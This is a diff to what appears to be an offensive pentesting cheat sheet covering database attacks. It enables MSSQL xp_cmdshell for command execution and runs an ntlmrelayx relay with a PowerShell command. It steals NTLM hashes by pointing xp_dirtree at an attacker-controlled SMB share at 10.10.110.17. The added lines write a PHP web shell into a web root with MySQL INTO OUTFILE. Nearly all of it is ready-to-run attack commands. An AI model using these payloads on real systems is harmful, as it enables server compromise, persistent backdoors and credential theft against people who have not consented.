@@ -1019,7 +1019,13 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powersh
 EXECUTE sp_configure 'show advanced options', 1
 EXECUTE sp_configure 'xp_cmdshell', 1
 RECONFIGURE
-xp_cmdshell 'whoami'
+xp_cmdshell 'whoami'     --> MSQL
+
+# MySQL - Write Local File
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+# MySQL - Secure File Privileges
+show variables like "secure_file_priv";
+
 
 # Hash stealing using the xp_dirtree command in MSSQL.
 EXEC master..xp_dirtree '\\10.10.110.17\share\'
